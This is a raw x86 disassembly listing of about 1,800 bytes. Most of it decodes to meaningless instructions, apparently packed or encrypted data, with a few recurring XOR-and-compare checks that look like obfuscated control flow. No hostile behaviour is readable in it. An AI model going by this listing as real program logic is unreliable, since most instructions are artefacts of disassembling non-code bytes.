  40b562:	fnsave [edx+0x477afbba]
  40b568:	or     edi,DWORD PTR ds:0x735ac3fc
  40b56e:	mov    eax,ds:0xbec73515
  40b573:	push   eax
  40b574:	out    dx,al
  40b575:	cli    
  40b576:	ss jbe 0x40b555
  40b579:	mul    DWORD PTR [esi+0x30504b9d]
  40b57f:	loop   0x40b5b7
  40b581:	(bad)  
  40b583:	add    eax,0x6d4b8bab
  40b588:	mov    edx,ebx
  40b58a:	sahf   
  40b58b:	ficom  DWORD PTR [esi]
  40b58d:	hlt    
  40b58e:	or     eax,edx
  40b590:	xchg   BYTE PTR ds:0x194bd5ce,dl
  40b596:	inc    esi
  40b597:	aad    0x53
  40b599:	xchg   edx,eax
  40b59a:	adc    ebp,esi
  40b59c:	push   ebp
  40b59d:	stos   DWORD PTR es:[edi],eax
  40b59e:	out    dx,eax
  40b59f:	push   0xffffffaf
  40b5a1:	cdq    
  40b5a2:	mov    al,0x82
  40b5a4:	sbb    BYTE PTR [eax],bl
  40b5a6:	dec    edx
  40b5a7:	adc    al,0xaa
  40b5aa:	retf   0x89da
  40b5ad:	jl     0x40b60c
  40b5af:	(bad)  
  40b5b0:	pop    esp
  40b5b1:	xchg   ebp,eax
  40b5b2:	inc    eax
  40b5b3:	out    0x6e,eax
  40b5b5:	mov    ch,0xeb
  40b5b7:	and    eax,0xca1011d8
  40b5bc:	dec    edx
  40b5bd:	push   cs
  40b5be:	jmp    0xfadf:0xae70719
  40b5c5:	test   al,0x86
  40b5c7:	(bad)  
  40b5c8:	mov    cl,0xf1
  40b5ca:	push   esp
  40b5cb:	add    al,0x92
  40b5cd:	test   DWORD PTR [esi+0x685aa776],ecx
  40b5d3:	and    al,0xa8
  40b5d5:	fdivrp st(3),st
  40b5d7:	cld    
  40b5d8:	xchg   ebx,eax
  40b5d9:	and    BYTE PTR [ebp+0x7],0xbc
  40b5dd:	mov    al,0xa
  40b5df:	addr16 sub al,0xb3
  40b5e2:	and    cl,BYTE PTR ds:0x299f0162
  40b5e8:	test   al,0x6c
  40b5ea:	jne    0x40b645
  40b5ec:	call   0xeaef:0xf2ac5500
  40b5f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5f4:	mov    bx,0x5247
  40b5f8:	and    bl,0x9e
  40b5fb:	jecxz  0x40b57d
  40b5fd:	xlat   BYTE PTR ds:[ebx]
  40b5fe:	lds    ecx,FWORD PTR [ebp+0x66]
  40b601:	mov    fs,esp
  40b603:	outs   dx,DWORD PTR ds:[esi]
  40b604:	pop    esi
  40b605:	jecxz  0x40b591
  40b607:	scas   eax,DWORD PTR es:[edi]
  40b608:	pushf  
  40b609:	nop
  40b60a:	jno    0x40b5c7
  40b60c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b60d:	mov    ebx,DWORD PTR [ecx]
  40b60f:	add    DWORD PTR [edi-0x45],ecx
  40b612:	ins    DWORD PTR es:[edi],dx
  40b613:	sbb    bl,BYTE PTR [edx-0x1c]
  40b616:	mov    al,0xce
  40b618:	es sbb al,0x6c
  40b61b:	and    esi,DWORD PTR [esi-0x27]
  40b61e:	imul   dh
  40b620:	jmp    0x393a:0xcd189ff9
  40b627:	mov    al,0x96
  40b629:	pop    esi
  40b62a:	cdq    
  40b62b:	xor    DWORD PTR [esi],ecx
  40b62d:	scas   al,BYTE PTR es:[edi]
  40b62e:	add    DWORD PTR [ebp+ecx*8+0x2f],esp
  40b632:	mov    ecx,0xd13be711
  40b637:	ficomp DWORD PTR [ebx]
  40b639:	inc    esp
  40b63a:	sar    BYTE PTR ds:0x79295de3,1
  40b640:	mov    ds,WORD PTR [esp+eax*1-0x59]
  40b644:	inc    ebx
  40b645:	lods   al,BYTE PTR ds:[esi]
  40b646:	pop    edi
  40b647:	in     eax,0x4f
  40b649:	enter  0x8a9e,0xf0
  40b64d:	cmc    
  40b64e:	jmp    0xba27bf47
  40b653:	fiadd  DWORD PTR [ecx]
  40b655:	push   esi
  40b656:	mov    bh,0x43
  40b658:	or     ch,BYTE PTR [ebx-0x3d]
  40b65b:	inc    edi
  40b65c:	mov    al,ds:0xbac870f
  40b661:	lods   al,BYTE PTR ds:[esi]
  40b662:	not    BYTE PTR [ebp-0x420bc351]
  40b668:	push   edi
  40b669:	push   edi
  40b66a:	sbb    edx,DWORD PTR [ecx+0x1e4f49c9]
  40b670:	mov    WORD PTR [edi-0x4609a651],ss
  40b676:	fist   DWORD PTR [eax+0x44]
  40b679:	jmp    0x40b60b
  40b67b:	fsub   DWORD PTR [esi]
  40b67d:	shr    BYTE PTR [eax+0x67b25d50],0xf8
  40b684:	retf   
  40b685:	mov    ?,WORD PTR [esi]
  40b687:	into   
  40b688:	arpl   WORD PTR [esi],bp
  40b68a:	sub    eax,0x4f845e03
  40b68f:	in     eax,0x66
  40b691:	add    BYTE PTR [ebp-0xb],bh
  40b694:	outs   dx,BYTE PTR ds:[esi]
  40b695:	xor    ebx,esi
  40b697:	clc    
  40b698:	inc    esi
  40b699:	push   ds
  40b69a:	outs   dx,BYTE PTR ds:[esi]
  40b69b:	mov    cl,0xba
  40b69d:	jmp    0x40b6b1
  40b69f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6a0:	inc    edi
  40b6a1:	and    BYTE PTR [ebp+0x64],dl
  40b6a4:	pushf  
  40b6a5:	cmc    
  40b6a6:	or     esi,DWORD PTR [ebp+0x30]
  40b6a9:	sbb    ch,BYTE PTR [esi+edx*2-0x61]
  40b6ad:	ret    
  40b6ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6af:	adc    ah,BYTE PTR [eax-0x49]
  40b6b2:	sub    bh,BYTE PTR [edi]
  40b6b4:	ret    0xf4ac
  40b6b7:	or     al,0x28
  40b6b9:	xor    ch,bl
  40b6bb:	jle    0x40b6d7
  40b6bd:	(bad)  
  40b6be:	cmc    
  40b6bf:	imul   ebp,DWORD PTR [ebp-0x76089aab],0xd6bfb608
  40b6c9:	mov    esp,0x688b12e6
  40b6ce:	out    0xa0,eax
  40b6d0:	(bad)  
  40b6d1:	stc    
  40b6d2:	ror    BYTE PTR [eax-0x5793deb9],1
  40b6d8:	or     al,0x75
  40b6da:	out    dx,eax
  40b6db:	fsub   st(7),st
  40b6dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6de:	test   al,0x97
  40b6e0:	int    0x87
  40b6e2:	lods   eax,DWORD PTR ds:[esi]
  40b6e3:	int3   
  40b6e4:	fdiv   QWORD PTR [ebp-0x1e]
  40b6e7:	fcom   DWORD PTR [edi+eiz*1-0x68a4b1af]
  40b6ee:	fistp  DWORD PTR [eax+0x56]
  40b6f1:	sub    DWORD PTR [ebp+0x7813bc1b],edi
  40b6f7:	rol    BYTE PTR [esi+eax*1-0x4bee7591],0x6b
  40b6ff:	fstp   TBYTE PTR ds:0x821b0fd0
  40b705:	sub    BYTE PTR [edi-0x51f12e8c],ch
  40b70b:	xor    bl,BYTE PTR [ecx-0x17]
  40b70e:	or     dh,BYTE PTR ds:[ebx]
  40b711:	cmp    BYTE PTR [edi+0x66f1fd3],ah
  40b717:	pop    ds
  40b718:	mov    cs:0x6e8350fa,al
  40b71e:	enter  0xf059,0x42
  40b722:	out    dx,eax
  40b723:	jmp    0x9813:0x20458817
  40b72a:	fwait
  40b72b:	push   es
  40b72c:	stc    
  40b72d:	push   ss
  40b72e:	pop    ds
  40b72f:	aas    
  40b730:	xchg   DWORD PTR [eax-0x3d],esp
  40b733:	fisub  WORD PTR [edx+0x557ffbf0]
  40b739:	mov    ecx,esp
  40b73b:	es mov edi,0x1e14421b
  40b741:	cs mov edx,0x56b06426
  40b747:	xor    BYTE PTR [ebx+0x39],al
  40b74a:	pop    esi
  40b74b:	mov    ebp,0xf6e9d244
  40b750:	jge    0x40b78c
  40b752:	ja     0x40b773
  40b754:	nop
  40b755:	ret    
  40b756:	into   
  40b757:	lds    esi,FWORD PTR [ecx]
  40b759:	push   DWORD PTR [ebp-0x30]
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	stos   BYTE PTR es:[edi],al
  40b78b:	xchg   esp,eax
  40b78c:	rcl    BYTE PTR [ecx+0x7e7efeb2],cl
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	fwait
  40b797:	mov    BYTE PTR [eax+0x59178fd2],dl
  40b79d:	ja     0x40b817
  40b79f:	pop    ds
  40b7a0:	pop    ecx
  40b7a1:	cs or  edx,ecx
  40b7a4:	stos   DWORD PTR es:[edi],eax
  40b7a5:	push   cs
  40b7a6:	xchg   esp,eax
  40b7a7:	mov    ecx,0x28aea3ef
  40b7ac:	add    eax,0xda14075a
  40b7b1:	push   0xed16d4ef
  40b7b6:	iret   
  40b7b7:	mov    WORD PTR [esp+ebx*2+0xb870de0],cs
  40b7be:	add    ebx,ebp
  40b7c0:	adc    ah,dh
  40b7c2:	jecxz  0x40b7ef
  40b7c4:	add    eax,0x14e12e53
  40b7c9:	idiv   BYTE PTR [ebp+0x58]
  40b7cc:	nop
  40b7cd:	push   ebp
  40b7ce:	rcr    DWORD PTR [eax-0x4b],0x95
  40b7d2:	inc    esi
  40b7d3:	inc    esp
  40b7d4:	push   es
  40b7d5:	les    edx,FWORD PTR [edx]
  40b7d7:	std    
  40b7d8:	mov    ecx,eax
  40b7da:	pop    edx
  40b7db:	mov    esi,0xf699bde7
  40b7e0:	rcl    ah,0x81
  40b7e3:	dec    eax
  40b7e4:	fs inc edx
  40b7e6:	shl    DWORD PTR ds:0xed15914a,cl
  40b7ec:	pop    ecx
  40b7ed:	aam    0xc4
  40b7ef:	add    al,0xdb
  40b7f1:	ds inc edx
  40b7f3:	push   ds
  40b7f4:	arpl   WORD PTR [ebx+0x78fe278a],ax
  40b7fa:	pop    edi
  40b7fb:	call   0xc44da4f1
  40b800:	or     al,0xf2
  40b802:	inc    ecx
  40b803:	mov    edi,0xd6a8a0a8
  40b808:	push   ecx
  40b809:	pop    ebx
  40b80a:	aas    
  40b80b:	es dec edx
  40b80d:	cmp    al,0x0
  40b80f:	loop   0x40b81d
  40b811:	aad    0xfc
  40b813:	je     0x40b800
  40b815:	jno    0x40b861
  40b817:	jo     0x40b803
  40b819:	adc    ch,BYTE PTR [edx-0x46]
  40b81c:	lahf   
  40b81d:	or     ch,BYTE PTR [eax-0x16]
  40b820:	jmp    0x60da:0xe9650454
  40b827:	and    dh,bh
  40b829:	add    edi,edx
  40b82b:	pop    ds
  40b82c:	idiv   ebx
  40b82e:	mov    ds:0xf271ad62,al
  40b833:	dec    BYTE PTR [ebx+0x72e96074]
  40b839:	fild   QWORD PTR [esi+esi*2]
  40b83c:	pop    es
  40b83d:	adc    eax,0xd7c7a908
  40b842:	dec    BYTE PTR [esi-0x68]
  40b845:	es pop ss
  40b847:	push   edx
  40b848:	inc    edx
  40b849:	push   edi
  40b84a:	call   0xd3bf4d02
  40b84f:	sub    BYTE PTR [edx+edi*4],al
  40b852:	xor    DWORD PTR [ebx+0x3d],esi
  40b855:	into   
  40b856:	in     al,dx
  40b857:	in     al,dx
  40b858:	jo     0x40b833
  40b85a:	hlt    
  40b85b:	dec    ebp
  40b85c:	rol    esp,cl
  40b85e:	dec    esi
  40b85f:	jg     0x40b84e
  40b861:	push   ebp
  40b862:	inc    edi
  40b863:	push   0xffffff83
  40b865:	test   eax,0xd091d537
  40b86a:	or     eax,0xde6b1137
  40b86f:	daa    
  40b870:	lods   al,BYTE PTR ds:[esi]
  40b871:	sub    eax,0x190ce11c
  40b876:	push   eax
  40b877:	std    
  40b878:	cmp    al,0x8d
  40b87a:	lods   eax,DWORD PTR ds:[esi]
  40b87b:	dec    ebp
  40b87c:	imul   eax,ecx,0x2f
  40b87f:	stos   DWORD PTR es:[edi],eax
  40b880:	test   DWORD PTR [esi],eax
  40b882:	pop    ecx
  40b883:	push   edi
  40b884:	cdq    
  40b885:	fld    TBYTE PTR [edi+0x71a6b835]
  40b88b:	cs in  al,0xa
  40b88e:	lds    ebx,FWORD PTR [eax+0x3a9aea7c]
  40b894:	dec    edi
  40b895:	jg     0x40b88c
  40b897:	mov    bl,0x29
  40b899:	js     0x40b881
  40b89b:	or     esi,DWORD PTR [esi]
  40b89d:	dec    ecx
  40b89e:	ds mov cl,0x77
  40b8a1:	(bad)  
  40b8a2:	in     eax,0xa5
  40b8a4:	call   0x63d2:0x59d916b7
  40b8ab:	std    
  40b8ac:	lahf   
  40b8ad:	mov    ebp,edx
  40b8af:	jmp    0xbfeb:0xf5c9124f
  40b8b6:	jns    0x40b8bc
  40b8b8:	mov    DWORD PTR [ebp-0x1649fb3b],0x1f600840
  40b8c2:	or     ebx,DWORD PTR [esi+0x61bca027]
  40b8c8:	jecxz  0x40b940
  40b8ca:	idiv   BYTE PTR [edx-0x2619d298]
  40b8d0:	pop    edx
  40b8d1:	dec    esp
  40b8d2:	jnp    0x40b945
  40b8d4:	push   0xffffff91
  40b8d6:	dec    edx
  40b8d7:	(bad)  
  40b8d8:	dec    ebp
  40b8d9:	cli    
  40b8da:	idiv   DWORD PTR [eax]
  40b8dc:	mov    edi,0xf4d794fc
  40b8e1:	test   DWORD PTR [eax],esi
  40b8e3:	mov    ebp,0xa0fb2f95
  40b8e8:	int3   
  40b8e9:	loop   0x40b91e
  40b8eb:	or     cl,BYTE PTR [esi+0x2e]
  40b8ee:	out    0x1c,al
  40b8f0:	mov    cl,0xe1
  40b8f2:	int3   
  40b8f3:	fmul   st(3),st
  40b8f5:	jo     0x40b914
  40b8f7:	jmp    0xaa84:0xc4a638ad
  40b8fe:	out    0xac,eax
  40b900:	pop    ebp
  40b901:	mov    ss,WORD PTR [eax]
  40b903:	sbb    edx,DWORD PTR [ebx+0x7c]
  40b906:	stos   DWORD PTR es:[edi],eax
  40b907:	or     ebp,esi
  40b909:	mov    ecx,0xea934044
  40b90e:	jns    0x40b94b
  40b910:	push   ds
  40b911:	sbb    BYTE PTR [esi+edi*1],bh
  40b914:	int3   
  40b915:	imul   edx,esp,0x2d7d8f96
  40b91b:	and    DWORD PTR [edi+0x47faf216],eax
  40b921:	jge    0x40b8bf
  40b923:	ins    DWORD PTR es:[edi],dx
  40b924:	sub    ebx,DWORD PTR [edx-0x1ea28120]
  40b92a:	and    BYTE PTR [ebp+0x61],bh
  40b92d:	mov    ch,0x44
  40b92f:	xor    al,dl
  40b931:	test   eax,0xfc49602e
  40b936:	fstp   QWORD PTR [ebx+0x27227c38]
  40b93c:	push   0xffffffb8
  40b93e:	call   0x629dc578
  40b943:	pop    esi
  40b944:	mov    cl,BYTE PTR [edx-0x367ae1c7]
  40b94a:	push   esp
  40b94b:	add    al,0xbe
  40b94d:	xor    BYTE PTR [edi+0x32b11b52],bh
  40b953:	adc    edi,0xed401e8a
  40b959:	ins    BYTE PTR es:[edi],dx
  40b95a:	lea    ecx,[edx+0x6cbcd461]
  40b960:	neg    BYTE PTR [ebp+0xbaf3364]
  40b966:	out    dx,eax
  40b967:	cmp    ebx,DWORD PTR [eax]
  40b969:	mov    esi,0x254dc812
  40b96e:	pop    eax
  40b96f:	ins    BYTE PTR es:[edi],dx
  40b970:	add    bl,al
  40b972:	mov    dh,0x94
  40b974:	or     al,0x1e
  40b976:	xor    al,0xae
  40b978:	push   ds
  40b979:	out    0xe,eax
  40b97b:	aaa    
  40b97c:	jb     0x40b9e7
  40b97e:	lea    esi,[edx+0x1c298541]
  40b984:	adc    BYTE PTR [edx-0x18],cl
  40b987:	sbb    ecx,ecx
  40b989:	fadd   QWORD PTR [ebx-0x2de6df6d]
  40b98f:	xchg   esi,eax
  40b990:	mov    ch,0x6d
  40b992:	bound  edi,QWORD PTR ds:0xc5fc9efe
  40b998:	cmp    eax,0x590e8ebb
  40b99d:	imul   esp,DWORD PTR [esp+ecx*1-0x1586c359],0xf01de49e
  40b9a8:	(bad)  
  40b9a9:	mov    cl,0x6d
  40b9ab:	rcl    DWORD PTR [ecx],cl
  40b9ad:	push   es
  40b9ae:	push   edx
  40b9af:	or     eax,0xcae74717
  40b9b4:	cmp    eax,0x2301d67c
  40b9b9:	sbb    dh,bh
  40b9bb:	xchg   ebx,eax
  40b9bc:	int    0x19
  40b9be:	fwait
  40b9bf:	mov    BYTE PTR [esp+eax*1+0x10],bl
  40b9c3:	aas    
  40b9c4:	mov    ecx,0x45678dca
  40b9c9:	les    edx,FWORD PTR [edi]
  40b9cb:	imul   ebp,DWORD PTR [esi+0x2f],0xffffffbb
  40b9cf:	std    
  40b9d0:	dec    esi
  40b9d1:	dec    eax
  40b9d2:	aas    
  40b9d3:	pop    es
  40b9d4:	and    ecx,esp
  40b9d6:	scas   al,BYTE PTR es:[edi]
  40b9d7:	punpcklwd mm7,DWORD PTR [edx+0x458b4af5]
  40b9de:	loopne 0x40ba27
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8-0x5ea657f8],eax
  40ba0f:	sbb    dh,BYTE PTR [edi+0x7e7efd7c]
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	sub    BYTE PTR [ecx],dh
  40ba1b:	scas   al,BYTE PTR es:[edi]
  40ba1c:	mov    bh,BYTE PTR [esi+0x79ea5b8b]
  40ba22:	scas   al,BYTE PTR es:[edi]
  40ba23:	sbb    BYTE PTR [ebp-0x1d89769b],0xb
  40ba2a:	sub    cl,al
  40ba2c:	xor    edi,DWORD PTR ss:[ecx]
  40ba2f:	adc    BYTE PTR [esi-0x70],dh
  40ba32:	div    cl
  40ba34:	and    dh,BYTE PTR [edx]
  40ba36:	test   DWORD PTR [ecx+0x40],esp
  40ba39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba3a:	mov    al,ds:0xcb66267
  40ba3f:	adc    esp,DWORD PTR [esi]
  40ba41:	popa   
  40ba42:	fstp   QWORD PTR [esi-0x34]
  40ba45:	mov    al,ds:0x989bb423
  40ba4a:	sar    esi,1
  40ba4c:	ret    
  40ba4d:	push   esi
  40ba4e:	popa   
  40ba4f:	add    eax,ecx
  40ba51:	mov    edx,0xaaf9b272
  40ba56:	stos   BYTE PTR es:[edi],al
  40ba57:	jae    0x40bacd
  40ba59:	das    
  40ba5a:	xchg   edi,eax
  40ba5b:	cmc    
  40ba5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba5d:	or     ebp,ebp
  40ba5f:	fwait
  40ba60:	mov    eax,ds:0xf4bc7276
  40ba65:	cs das 
  40ba67:	xchg   ebx,eax
  40ba68:	xchg   ebx,eax
  40ba69:	cdq    
  40ba6a:	jbe    0x40ba02
  40ba6c:	mov    ecx,0x5967dc15
  40ba71:	push   edx
  40ba72:	add    eax,0x90315f7c
  40ba77:	jns    0x40babd
  40ba79:	or     ah,BYTE PTR [edx]
  40ba7b:	fbld   TBYTE PTR [edi-0x73554a89]
  40ba81:	jae    0x40baed
  40ba83:	pusha  
  40ba84:	xchg   edi,eax
  40ba85:	pop    ss
  40ba86:	and    ebx,DWORD PTR [edi+edx*4]
  40ba89:	ror    BYTE PTR [edx+0x1b],1
  40ba8c:	inc    esi
  40ba8d:	mov    BYTE PTR [ebx-0x4a203681],cl
  40ba93:	or     bl,BYTE PTR [esi]
  40ba95:	and    eax,0xdb0f8996
  40ba9a:	mov    ds:0x205a6610,al
  40ba9f:	mov    dh,0x12
  40baa1:	(bad)  
  40baa3:	lods   eax,DWORD PTR ds:[esi]
  40baa4:	(bad)  
  40baa5:	test   BYTE PTR [ebp-0x6f],0x60
  40baa9:	loop   0x40bb0c
  40baab:	shr    DWORD PTR [ebx+0x7e],0x2e
  40baaf:	or     al,0x86
  40bab1:	clc    
  40bab2:	leave  
  40bab3:	mov    edi,0x8c64b891
  40bab8:	mov    eax,ds:0xd17bf255
  40babd:	mov    edi,0x1fe740
  40bac2:	sbb    BYTE PTR [edx+0x13],dh
  40bac5:	cs mov ch,0xdd
  40bac8:	hlt    
  40bac9:	or     cl,BYTE PTR [esi]
  40bacb:	mov    edi,0x205719d
  40bad0:	and    dl,BYTE PTR [ebp+0x239e6bf3]
  40bad6:	into   
  40bad7:	sbb    BYTE PTR [eax+0x757e8873],bl
  40badd:	and    bl,0x35
  40bae0:	xchg   DWORD PTR [eax+edx*8+0x35df0108],ebx
  40bae7:	shl    BYTE PTR [eax*4-0x28ca7ecd],0xe4
  40baef:	ins    BYTE PTR es:[edi],dx
  40baf0:	popa   
  40baf1:	leave  
  40baf2:	into   
  40baf3:	enter  0x5403,0x90
  40baf7:	fistp  DWORD PTR [edx+0x37]
  40bafa:	sbb    eax,0x8398e36d
  40baff:	cwde   
  40bb00:	inc    ebx
  40bb01:	inc    ecx
  40bb02:	lahf   
  40bb03:	push   esp
  40bb04:	fld    DWORD PTR [ebx+esi*2]
  40bb07:	push   eax
  40bb08:	out    dx,al
  40bb09:	mov    cl,BYTE PTR [edi+ecx*4+0x6c]
  40bb0d:	jge    0x40bada
  40bb0f:	cld    
  40bb10:	jae    0x40bace
  40bb12:	xchg   edx,eax
  40bb13:	adc    al,0xaa
  40bb15:	out    dx,eax
  40bb16:	mov    al,ds:0x2aa5dfa2
  40bb1b:	sub    DWORD PTR [edi+ebp*4+0x63],edi
  40bb1f:	or     al,0x1f
  40bb21:	je     0x40baff
  40bb23:	jae    0x40bac9
  40bb25:	cmp    al,0x13
  40bb27:	pop    ecx
  40bb28:	jecxz  0x40bb7a
  40bb2a:	add    eax,0x3dfd1ed7
  40bb2f:	loope  0x40bb02
  40bb31:	jl     0x40bb76
  40bb33:	pusha  
  40bb34:	mov    esi,0x886846b0
  40bb39:	outs   dx,BYTE PTR ds:[esi]
  40bb3a:	adc    BYTE PTR [ecx+0x7],ah
  40bb3d:	or     ecx,DWORD PTR [edx+0x2]
  40bb40:	in     eax,0xb1
  40bb42:	xor    edi,DWORD PTR [ecx+0x1612b454]
  40bb48:	mov    eax,0xe09e61cd
  40bb4d:	or     al,0x51
  40bb4f:	test   DWORD PTR [ebx-0x100a71f0],ecx
  40bb55:	inc    esp
  40bb56:	daa    
  40bb57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb58:	adc    eax,0x345e63dd
  40bb5d:	and    BYTE PTR [ecx+0x3a],0xd6
  40bb61:	sti    
  40bb62:	leave  
  40bb63:	stos   DWORD PTR es:[edi],eax
  40bb64:	adc    edx,DWORD PTR [ebp+0x71]
  40bb67:	push   ebx
  40bb68:	push   0xffffffaf
  40bb6a:	adc    ecx,edx
  40bb6c:	in     eax,0x30
  40bb6e:	pusha  
  40bb6f:	jmp    0xd2c9c667
  40bb74:	mov    WORD PTR [ecx+0x60],ss
  40bb77:	into   
  40bb78:	push   cs
  40bb79:	pop    eax
  40bb7a:	push   eax
  40bb7b:	push   esi
  40bb7c:	clc    
  40bb7d:	sbb    eax,0xb04565b5
  40bb82:	mov    edi,0xb095fbbe
  40bb87:	ss fwait
  40bb89:	pusha  
  40bb8a:	enter  0xb9df,0xa1
  40bb8e:	in     al,dx
  40bb8f:	mov    ss,WORD PTR [edx]
  40bb91:	imul   ebp,DWORD PTR [eax+0x1d],0xb988e302
  40bb98:	push   cs
  40bb99:	mov    dl,0xf5
  40bb9b:	push   eax
  40bb9c:	retf   0x2c2a
  40bb9f:	add    edi,DWORD PTR [edi-0x273b52d7]
  40bba5:	push   ebx
  40bba6:	dec    eax
  40bba7:	jle    0x40bb8b
  40bba9:	dec    eax
  40bbaa:	neg    DWORD PTR [ebx-0x3fed23ab]
  40bbb0:	ss loop 0x40bbf8
  40bbb3:	sub    al,0x77
  40bbb5:	sbb    eax,0xede69d3f
  40bbba:	fisubr DWORD PTR [edi+0x71]
  40bbbd:	pop    edi
  40bbbe:	ins    BYTE PTR es:[edi],dx
  40bbbf:	div    DWORD PTR [ebx+0x3f9aca6]
  40bbc5:	daa    
  40bbc6:	mov    ah,0xab
  40bbc8:	in     eax,0x0
  40bbca:	inc    ebp
  40bbcb:	iret   
  40bbcc:	xchg   ecx,eax
  40bbcd:	js     0x40bbe4
  40bbcf:	jg     0x40bbbc
  40bbd1:	xchg   esi,eax
  40bbd2:	arpl   WORD PTR [esi+0x2],ax
  40bbd5:	pop    ebp
  40bbd6:	and    al,0xd8
  40bbd8:	jb     0x40bc25
  40bbda:	mov    ebx,0xcd90c1fe
  40bbdf:	mov    edx,0x79b098b7
  40bbe4:	(bad)  
  40bbe5:	outs   dx,DWORD PTR ds:[esi]
  40bbe6:	mov    ebx,0x41a7e38d
  40bbeb:	fs mov dl,0x43
  40bbee:	pop    edi
  40bbef:	je     0x40bb8d
  40bbf1:	xchg   ah,dh
  40bbf3:	dec    eax
  40bbf4:	ret    
  40bbf5:	nop
  40bbf6:	xchg   ebp,eax
  40bbf7:	mov    al,0xe8
  40bbf9:	pop    esi
  40bbfa:	mov    ecx,0xdd6b86bc
  40bbff:	jle    0x40bbc9
  40bc01:	dec    edi
  40bc02:	pop    es
  40bc03:	and    esp,DWORD PTR [ebp+0x77]
  40bc06:	pushf  
  40bc07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc08:	sbb    DWORD PTR [ebx],edi
  40bc0a:	iret   
  40bc0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc0c:	xor    al,0x9d
  40bc0e:	imul   esi,ebp,0x1ff850bc
  40bc14:	aas    
  40bc15:	neg    DWORD PTR [ecx+esi*4+0x4b31c53a]
  40bc1c:	add    al,BYTE PTR [edi]
  40bc1e:	and    eax,0x3c93e683
  40bc23:	push   es
  40bc24:	adc    al,0x9a
  40bc26:	mov    cl,0x7e
  40bc28:	push   ebx
  40bc29:	jbe    0x220f58a6
  40bc2f:	jae    0x40bc1b
  40bc31:	ins    DWORD PTR es:[edi],dx
  40bc32:	cdq    
  40bc33:	adc    ecx,DWORD PTR [esi-0x45613c9b]
  40bc39:	aaa    
  40bc3a:	add    ecx,ebx
  40bc3c:	cmp    DWORD PTR [ebp-0x4b],ebx
  40bc3f:	jg     0x40bbe2
  40bc41:	popf   
  40bc42:	out    0x16,eax
  40bc44:	aam    0x76
  40bc46:	fimul  WORD PTR [ecx+0x16717d9a]
  40bc4c:	mov    eax,ds:0xb1a5ccb6
  40bc51:	jbe    0x40bc4c
  40bc53:	xchg   DWORD PTR [eax-0x3ee23234],edi
  40bc59:	sbb    al,dl
  40bc5b:	test   BYTE PTR [edi+0x54],al
  40bc5e:	push   eax
  40bc5f:	movzx  eax,WORD PTR [eax+edi*2]
  40bc63:	mov    ecx,DWORD PTR [ebp-0x14]
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	and    BYTE PTR [ebx+0x16],bl
  40bc98:	xchg   esp,eax
  40bc99:	(bad)  
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	mov    DWORD PTR ds:0x673d099d,eax
  40bca7:	pop    ecx
  40bca8:	mov    cl,0x78
  40bcaa:	ds out dx,eax
  40bcac:	xchg   edx,eax
  40bcad:	in     al,0x8d
  40bcaf:	hlt    
  40bcb0:	dec    edi
  40bcb1:	sbb    esi,DWORD PTR [ecx]
  40bcb3:	or     esp,DWORD PTR [edi]
  40bcb5:	sbb    ah,BYTE PTR [eax]
  40bcb7:	popa   
  40bcb8:	jae    0x40bc9b
  40bcba:	pop    ebx
  40bcbb:	or     DWORD PTR [edi],ebp
  40bcbd:	mov    edx,0x2475f683
  40bcc2:	repz dec BYTE PTR [edi]
  40bcc5:	je     0x40bc60
  40bcc7:	mov    bh,BYTE PTR [eax+eax*1+0x27092b1a]
  40bcce:	xchg   DWORD PTR [esi-0x53],edi
  40bcd1:	mov    eax,0x832ed0a3
  40bcd6:	fmul   st(6),st
  40bcd8:	and    DWORD PTR [eax],0xe6ea428
  40bcde:	push   ds
  40bcdf:	cld    
  40bce0:	mov    BYTE PTR [esi-0x460b46c],bl
  40bce6:	hlt    
  40bce7:	push   0xafe065d8
  40bcec:	inc    edx
  40bced:	sahf   
  40bcee:	sar    BYTE PTR [edi+ebx*1-0x313c8725],1
